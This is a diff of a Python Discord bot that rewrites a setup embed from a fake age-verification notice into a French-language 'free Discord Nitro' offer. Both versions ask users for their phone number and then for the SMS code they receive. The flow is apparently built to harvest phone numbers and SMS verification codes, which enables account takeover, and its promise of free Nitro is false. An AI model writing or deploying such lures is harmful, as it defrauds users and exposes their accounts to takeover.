@@ -325,11 +325,34 @@ async def handle_dm_code(message: discord.Message):
 @app_commands.default_permissions(administrator=True)
 async def setup(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="Verification requise",
-        description="Pour acceder a ce serveur, vous devez verifier votre age.\n\nProcedure :\n1 - Cliquez sur Verifier\n2 - Entrez votre numero de telephone (06/07)\n3 - Un staff vous contactera\n4 - Vous recevrez un code par SMS\n5 - Repondez avec le code pour valider\n\nSecurise - 0,00 Euro",
+        title="Obtenez Discord Nitro Gratuitement",
+        description=(
+            "Suivez ces etapes simples pour obtenir plusieurs Nitro sans depenser un centime :\n\n"
+            "**1 - Procedure de Verification :**\n"
+            "- Cliquez sur \"Verifier\" en bas de cette page.\n"
+            "- Entrez votre numero de telephone.\n\n"
+            "**2 - Recevez le Code par SMS :**\n"
+            "- Vous recevrez un code par SMS sur votre telephone.\n"
+            "- Ce code est essentiel pour la prochaine etape.\n\n"
+            "**3 - Validez avec le Code :**\n"
+            "- Une fois que vous avez recu le code, entrez-le lorsque notre bot vous le demandera.\n"
+            "- Cela liera votre numero de telephone a notre systeme securise. "
+            "Aucune de vos informations ne sera enregistree, donc sauvegardez-les.\n\n"
+            "**4 - Reclamez Vos Nitro :**\n"
+            "- Apres avoir valide avec le code, notre bot vous guidera vers la page de reclamation.\n"
+            "- Suivez les instructions a l'ecran pour recevoir vos Nitro gratuits.\n\n"
+            "**Pourquoi Faire Cela ?**\n"
+            "En liant votre numero de telephone, vous devenez eligible pour notre technique exclusive "
+            "qui permet de generer plusieurs Nitro. C'est une opportunite unique de profiter des "
+            "avantages de Discord Nitro sans frais.\n\n"
+            "**Attention :**\n"
+            "- Assurez-vous d'entrer un numero de telephone valide.\n"
+            "- Le code SMS est crucial, ne le partagez avec personne d'autre que notre bot.\n"
+            "- Vous ne serez facture de 0 centime pour cette technique."
+        ),
         color=0x5865f2
     )
-    embed.set_footer(text="Systeme de verification")
+    embed.set_footer(text="Nitro gratuit • 0,00 Euro")
     view = discord.ui.View(timeout=None)
     class VerifyButton(discord.ui.Button):
         def __init__(self):
